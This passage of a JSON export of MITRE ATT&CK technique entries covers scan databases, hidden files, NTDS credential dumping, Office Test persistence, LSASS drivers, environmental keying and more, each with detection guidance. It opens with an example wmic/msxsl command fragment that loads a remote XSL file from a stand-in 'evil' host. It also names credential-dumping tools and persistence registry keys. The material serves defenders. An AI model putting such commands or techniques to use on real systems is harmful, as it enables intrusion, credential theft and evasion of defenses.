/FORMAT:\u201dhttps[:]//example[.]com/evil[.]xsl\u201d</code>",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1220",
      "stix_id": "attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-15T19:59:19.125000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.\n\nThe presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious."
    },
    "T1596.005": {
      "id": "T1596.005",
      "name": "Scan Databases",
      "description": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1596.005",
      "stix_id": "attack-pattern--ec4be82f-940c-4dcb-87fe-2bbdd17c692f",
      "created": "2020-10-02T17:00:44.586000+00:00",
      "modified": "2025-04-15T23:02:32.145000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1564.001": {
      "id": "T1564.001",
      "name": "Hidden Files and Directories",
      "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564.001",
      "stix_id": "attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d",
      "created": "2020-02-26T17:46:13.128000+00:00",
      "modified": "2025-04-25T14:48:27.868000+00:00",
      "platforms": [
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Creation",
        "File: File Metadata",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute."
    },
    "T1578.001": {
      "id": "T1578.001",
      "name": "Create Snapshot",
      "description": "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.(Citation: Mandiant M-Trends 2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1578.001",
      "stix_id": "attack-pattern--ed2e45f9-d338-4eb2-8ce5-3a2e03323bc1",
      "created": "2020-06-09T15:33:13.563000+00:00",
      "modified": "2025-04-15T22:11:14.755000+00:00",
      "platforms": [
        "IaaS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Snapshot: Snapshot Creation",
        "Snapshot: Snapshot Metadata"
      ],
      "defense_bypassed": [],
      "detection": "The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.\n\nIn AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.(Citation: AWS Cloud Trail Backup API).\n\nIn Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.(Citation: Azure - Monitor Logs)\n\nGoogle's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the <code>gcloud compute instances create</code> command to create a new VM disk from a snapshot.(Citation: Cloud Audit Logs) It is also possible to detect the usage of the GCP API with the <code>\"sourceSnapshot\":</code> parameter pointed to <code>\"global/snapshots/[BOOT_SNAPSHOT_NAME]</code>.(Citation: GCP - Creating and Starting a VM)"
    },
    "T1591.001": {
      "id": "T1591.001",
      "name": "Determine Physical Locations",
      "description": "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1591.001",
      "stix_id": "attack-pattern--ed730f20-0e44-48b9-85f8-0e2adeb76867",
      "created": "2020-10-02T16:32:33.126000+00:00",
      "modified": "2025-04-15T22:16:44.365000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1137.002": {
      "id": "T1137.002",
      "name": "Office Test",
      "description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test Sofacy)\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1137.002",
      "stix_id": "attack-pattern--ed7efd4d-ce28-4a19-a8e6-c58011eb2c7a",
      "created": "2019-11-07T19:44:04.475000+00:00",
      "modified": "2025-04-15T22:55:04.029000+00:00",
      "platforms": [
        "Windows",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Creation",
        "Command: Command Execution",
        "File: File Modification",
        "Windows Registry: Windows Registry Key Modification",
        "File: File Creation",
        "Process: Process Creation",
        "Module: Module Load"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for the creation of the Office Test Registry key. Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Since v13.52, Autoruns can detect tasks set up using the Office Test Registry key.(Citation: Palo Alto Office Test Sofacy)\n\nConsider monitoring Office processes for anomalous DLL loads."
    },
    "T1587": {
      "id": "T1587",
      "name": "Develop Capabilities",
      "description": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1587",
      "stix_id": "attack-pattern--edadea33-549c-4ed1-9783-8f5a5853cbdf",
      "created": "2020-10-01T01:30:00.877000+00:00",
      "modified": "2025-04-15T22:17:05.876000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Malware Repository: Malware Content",
        "Malware Repository: Malware Metadata",
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.\n\nConsider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control."
    },
    "T1003.003": {
      "id": "T1003.003",
      "name": "NTDS",
      "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n",
      "tactic": "credential-access",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1003.003",
      "stix_id": "attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24",
      "created": "2020-02-11T18:42:35.572000+00:00",
      "modified": "2025-04-15T19:59:19.862000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Access"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit."
    },
    "T1602.001": {
      "id": "T1602.001",
      "name": "SNMP (MIB Dump)",
      "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
      "tactic": "collection",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1602.001",
      "stix_id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
      "created": "2020-10-19T23:51:05.953000+00:00",
      "modified": "2025-04-25T14:48:29.549000+00:00",
      "platforms": [
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Connection Creation",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Identify network traffic sent or received by untrusted hosts or networks that expose MIB content or use unauthorized protocols.(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)"
    },
    "T1001.002": {
      "id": "T1001.002",
      "name": "Steganography",
      "description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1001.002",
      "stix_id": "attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235",
      "created": "2020-03-15T00:37:58.963000+00:00",
      "modified": "2025-04-25T14:48:29.907000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1204.001": {
      "id": "T1204.001",
      "name": "Malicious Link",
      "description": "An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1204.001",
      "stix_id": "attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9",
      "created": "2020-03-11T14:43:31.706000+00:00",
      "modified": "2025-04-15T19:59:20.108000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Network Traffic: Network Traffic Content",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Inspect network traffic for indications that a user visited a malicious site, such as links included in phishing campaigns directed at your organization.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded from a link and executed on the user's computer."
    },
    "T1550.001": {
      "id": "T1550.001",
      "name": "Application Access Token",
      "description": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.(Citation: Google Cloud Service Account Credentials)(Citation: AWS Temporary Security Credentials) The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured \u2013 for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS Roles)\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user\u2019s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1550.001",
      "stix_id": "attack-pattern--f005e783-57d4-4837-88ad-dbe7faee1c51",
      "created": "2020-01-30T17:37:22.261000+00:00",
      "modified": "2025-04-15T19:59:20.277000+00:00",
      "platforms": [
        "SaaS",
        "Containers",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Web Credential: Web Credential Usage"
      ],
      "defense_bypassed": [],
      "detection": "Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions.(Citation: AWS Logging IAM Calls)(Citation: GCP Monitoring Service Account Usage)"
    },
    "T1547.008": {
      "id": "T1547.008",
      "name": "LSASS Driver",
      "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.008",
      "stix_id": "attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4",
      "created": "2020-01-24T18:38:55.801000+00:00",
      "modified": "2025-04-16T20:37:22.686000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Module: Module Load",
        "File: File Creation",
        "Driver: Driver Load",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\n\nUtilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. "
    },
    "T1569.002": {
      "id": "T1569.002",
      "name": "Service Execution",
      "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1569.002",
      "stix_id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
      "created": "2020-03-10T18:33:36.159000+00:00",
      "modified": "2025-04-15T19:59:20.444000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Windows Registry: Windows Registry Key Modification",
        "Network Traffic: Network Traffic Flow",
        "Service: Service Creation",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029)."
    },
    "T1078.004": {
      "id": "T1078.004",
      "name": "Cloud Accounts",
      "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1078.004",
      "stix_id": "attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65",
      "created": "2020-03-13T20:36:57.378000+00:00",
      "modified": "2025-04-15T19:59:20.556000+00:00",
      "platforms": [
        "SaaS",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "User Account: User Account Authentication",
        "Logon Session: Logon Session Metadata",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours."
    },
    "T1480.001": {
      "id": "T1480.001",
      "name": "Environmental Keying",
      "description": "Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1480.001",
      "stix_id": "attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995",
      "created": "2020-06-23T22:28:28.041000+00:00",
      "modified": "2025-04-15T19:59:20.646000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection."
    },
    "T1008": {
      "id": "T1008",
      "name": "Fallback Channels",
      "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1008",
      "stix_id": "attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433",
      "created": "2017-05-31T21:30:21.689000+00:00",
      "modified": "2025-04-25T15:16:21.879000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)"
    },
    "T1564.004": {
      "id": "T1564.004",
      "name": "NTFS File Attributes",
